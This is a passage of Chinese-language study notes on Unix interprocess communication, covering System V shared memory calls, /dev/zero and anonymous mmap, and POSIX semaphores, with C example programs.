title="共享内存"></a>共享内存</h2><p>共享内存允许两个或多个进程共享给定的内存区域。</p><p><strong>共享内存的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_perm</span> <span class="hljs-title">shm_perm</span>;</span> <span class="hljs-comment">/* see Section 15.6.2 */</span><br><span class="hljs-type">size_t</span> shm_segsz; <span class="hljs-comment">/* size of segment in bytes */</span><br><span class="hljs-type">pid_t</span> shm_lpid; <span class="hljs-comment">/* pid of last shmop() */</span><br><span class="hljs-type">pid_t</span> shm_cpid; <span class="hljs-comment">/* pid of creator */</span><br><span class="hljs-type">shmatt_t</span> shm_nattch; <span class="hljs-comment">/* number of current attaches */</span><br><span class="hljs-type">time_t</span> shm_atime; <span class="hljs-comment">/* last-attach time */</span><br><span class="hljs-type">time_t</span> shm_dtime; <span class="hljs-comment">/* last-detach time */</span><br><span class="hljs-type">time_t</span> shm_ctime; <span class="hljs-comment">/* last-change time */</span><br>...<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="shmget"><a href="#shmget" class="headerlink" title="shmget"></a>shmget</h3><p><strong>获取共享内存的identifier</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shmget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flag)</span>;<br>Returns:shared memory ID <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><h3 id="shmctl"><a href="#shmctl" class="headerlink" title="shmctl"></a>shmctl</h3><p><strong>操作共享内存</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> shmid_ds *buf)</span>;<br><br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><code>cmd</code>指示了操作的行为</p><ul><li><code>IPC_STAT</code>：从段中获取<code>shmid_ds</code>结构体，并且将这个结构存入<code>buf</code></li><li><code>IPC_SET</code>：从与此共享内存段关联的<code>shmid_ds</code>结构中<code>buf</code>指向的结构中设置以下三个字段：<code>shm_perm.uid</code>、<code>shm_perm_gid</code>和<code>shm_perm.mode</code>。此命令只能由有效用户ID等于<code>shm_permcuid</code>或<code>shm_perk.uid</code>的进程或具有超级用户权限的进程执行。</li><li><code>IPC_RMID</code>：从系统中删除共享内存段集。由于为共享内存段（<code>shmid_ds</code>结构中的<code>shm_attch</code>字段）保留了一个附加计数，因此在使用该段的最后一个进程终止或分离该段之前，不会删除该段。无论该段是否仍在使用，都会立即删除该段的标识符，以便<code>shmat</code>不再附加该段。此命令只能由有效用户<code>ID</code>等于<code>shm_perm.uid</code>或<code>shm_perm.uid</code>的进程或具有超级用户权限的进程执行。</li></ul><p><strong>LINUX额外增加的命令</strong></p><ul><li><code>SHM_LOCK</code>：将共享内存段锁定在内存中。此命令只能由超级用户执行。</li><li><code>SHM_UNLOCK</code>：解锁共享内存段。此命令只能由超级用户执行。</li></ul><h3 id="shmat"><a href="#shmat" class="headerlink" title="shmat"></a>shmat</h3><p>共享存储段连接到调用进程的哪个地址上与<code>addr</code>参数以及<code>flag</code>中是否制定<code>SHM_RND</code>位有关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr, <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-comment">//Returns: pointer to shared memory segment if OK, -1 on error</span><br></code></pre></td></tr></table></figure><ul><li><p><code>addr</code>为0：则此段链接到由内核选择的第一个可用地址上。</p></li><li><p><code>addr</code>非0并且<code>SHM_RND</code>没被指定，该段被附着的地址为<code>addr</code></p></li><li><p><code>addr</code>非0并且指定<code>SHM_RND</code>，该段被附着的地址为<code>addr</code>-（<code>addr</code> % <code>SHMLBA</code>）.<code>SHM_RND</code>为取整。</p></li><li><p>若<code>flag</code>的指定了<code>SHM_RDONLY</code>位，则以只读形式连接此段，否则以读写形式连接此段。</p></li></ul><h3 id="shmdt"><a href="#shmdt" class="headerlink" title="shmdt"></a>shmdt</h3><p>使用<code>shmdt</code>函数可以将地址从共享存储段中分离。并不是<strong>删除</strong>，直到带<code>IPC_RMID</code>命令的调用<code>shmctl</code>特地删除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shmdt</span><span class="hljs-params">(<span class="hljs-type">const</span> vidd *addr)</span>;<br><span class="hljs-comment">//返回值：成功返回0，出错，返回-1</span><br></code></pre></td></tr></table></figure><p><strong>example1</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_SIZE 40000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_SIZE 100000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_MODE 0600</span><br><br><span class="hljs-type">char</span> <span class="hljs-built_in">array</span>[ARRAY_SIZE];<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> shmid;<br>    <span class="hljs-type">char</span> *ptr, *shmptr;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[] from %p to %p\n&quot;</span>,(<span class="hljs-type">void</span> *)&amp;<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>], (<span class="hljs-type">void</span> *)&amp;<span class="hljs-built_in">array</span>[ARRAY_SIZE]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack around %p\n&quot;</span>,(<span class="hljs-type">void</span> *)&amp;shmid);<br><br>    <span class="hljs-keyword">if</span> ((ptr = <span class="hljs-built_in">malloc</span>(MALLOC_SIZE)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloced from %p to %p\n&quot;</span>, (<span class="hljs-type">void</span> *)ptr, (<span class="hljs-type">void</span> *)ptr+MALLOC_SIZE);<br><br>    <span class="hljs-keyword">if</span> ((shmid = shmget(IPC_PRIVATE, SHM_SIZE, SHM_MODE)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmget error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((shmptr = shmat(shmid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmat error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;shared memory attached from %p to %p\n&quot;</span>, (<span class="hljs-type">void</span> *)shmptr, (<span class="hljs-type">void</span> *)shmptr+SHM_SIZE);<br><br>    <span class="hljs-keyword">if</span> (shmctl(shmid, IPC_RMID, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmctl error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>example2</strong></p><p>使用<code>/dev/zero</code>设备使得两个相关进程共享一段匿名内存</p><p>使用<code>/dev/zero</code>设备的好处</p><ul><li>创建一个未命名的存储区，长度为<code>mmap</code>的第二个参数，页对齐</li><li>存储区都初始化为0</li><li>若指定了<code>MAP_SHARED</code>则进程共享此区域</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NLOOPS 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE sizeof(long)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> pfd1[<span class="hljs-number">2</span>], pfd2[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">TELL_WAIT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pfd1) &lt; <span class="hljs-number">0</span> || pipe(pfd2) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//初始化两个管道</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pipe error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//pfd2父进程写，子进程读</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">TELL_PARENT</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (write(pfd2[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">WAIT_PARENT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-keyword">if</span> (read(pfd1[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;p&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;WAIT_PARENT: incorrect data&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//pfd1为子进程写，父进程读</span><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">TELL_CHILD</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(write(pfd1[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">WAIT_CHILD</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-keyword">if</span> (read(pfd2[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;c&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-string">&quot;WAIT_CHILD: incorrect data&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">long</span> *ptr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ((*ptr)++);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, i, counter;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">void</span> *area;<br><br>    <span class="hljs-keyword">if</span> ((fd = open(<span class="hljs-string">&quot;/dev/zero&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;open error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((area = mmap(<span class="hljs-number">0</span>, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>)) == MAP_FAILED) <span class="hljs-comment">//将/dev/zero文件映射到内存中</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;mmap error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    close(fd);<br><br>    TELL_WAIT(); <span class="hljs-comment">//注册管道</span><br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//父进程</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NLOOPS; i += <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span> ((counter = update((<span class="hljs-type">long</span> *)area)) != i)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;parent: expected %d, got %d&quot;</span>,i, counter);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            TELL_CHILD(pid);<br>            WAIT_CHILD();<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NLOOPS + <span class="hljs-number">1</span>; i += <span class="hljs-number">2</span>)&#123;<br>            WAIT_PARENT();<br><br>            <span class="hljs-keyword">if</span> ((counter = update((<span class="hljs-type">long</span> *)area)) != i)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;child: expected %d, got %d&quot;</span>, i, counter);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            TELL_PARENT(getppid());<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="匿名映射"><a href="#匿名映射" class="headerlink" title="匿名映射"></a>匿名映射</h3><p><code>MAP_ANON</code>为建立匿名映射区域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mmap(<span class="hljs-number">0</span>, SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h2 id="POSIX信号量"><a href="#POSIX信号量" class="headerlink" title="POSIX信号量"></a>POSIX信号量</h2><p><code>POSX</code>信号量分为命名信号量与匿名信号量</p><h3 id="sem-open"><a href="#sem-open" class="headerlink" title="sem_open"></a>sem_open</h3><p>创建和使用命名信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-type">sem_t</span> *<span class="hljs-title function_">sem_open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">int</span> oflag, <span class="hljs-type">mode_t</span> mode, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value)</span>;<br><span class="hljs-comment">//返回值：成功，返回指向信号量的指针；若出错，返回SEM_FAILED</span><br></code></pre></td></tr></table></figure><ul><li>当使用现有的信号量时，只需要指定<code>name</code>和<code>oflag</code>参数为0即可。</li><li>当使用<code>oflag</code>为<code>O_CREAT</code>标志时，若信号量不存在则会创建，若存在则直接使用<ul><li>需要额外指定两个参数<ul><li><code>mode</code>：谁可以访问该信号量</li><li><code>value</code>：指定信号量的初始化值，范围为<code>0-SEM_VALUE_MAX</code></li></ul></li></ul></li><li>若想确保信号量为新建，则可以指定<code>oflag</code>为<code>O_CREAT|O_EXCL</code>，若信号量已存在则会导致<code>sem_open</code>失败</li></ul><h3 id="sem-close"><a href="#sem-close" class="headerlink" title="sem_close"></a>sem_close</h3><p>关闭信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_close</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h3 id="sem-unlink"><a href="#sem-unlink" class="headerlink" title="sem_unlink"></a>sem_unlink</h3><p>销毁命名信号量，若没有对信号量的引用则直接销毁，若存在则等待到没引用时进行销毁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_unlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h3 id="sem-wait和sem-trywait"><a href="#sem-wait和sem-trywait" class="headerlink" title="sem_wait和sem_trywait"></a>sem_wait和sem_trywait</h3><p>对信号量进行减一操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_trywait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br><br><span class="hljs-comment">//两个函数的返回值：若成功，返回0；若出错则返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>sem_wait</code>，若信号量为0会阻塞</li><li><code>sem_trywait</code>，若信号量为0不会阻塞，而是直接返回-1并且将<code>errno</code>设置为<code>EAGAIN</code></li></ul><h3 id="sem-timedwait"><a href="#sem-timedwait" class="headerlink" title="sem_timedwait"></a>sem_timedwait</h3><p>阻塞一段时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_timedwait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *<span class="hljs-keyword">restrict</span> sem,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li>若超时则直接返回-1，将<code>errno</code>设置为<code>ETIMEDOUT</code></li></ul><h3 id="sem-post"><a href="#sem-post" class="headerlink" title="sem_post"></a>sem_post</h3><p>将信号量值增加1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_post</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回0;若出错,返回-1</span><br></code></pre></td></tr></table></figure><h3 id="sem-init"><a href="#sem-init" class="headerlink" title="sem_init"></a>sem_init</h3><p>创建未命名的信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_init</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem, <span class="hljs-type">int</span> pshared, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value)</span>;<br><span 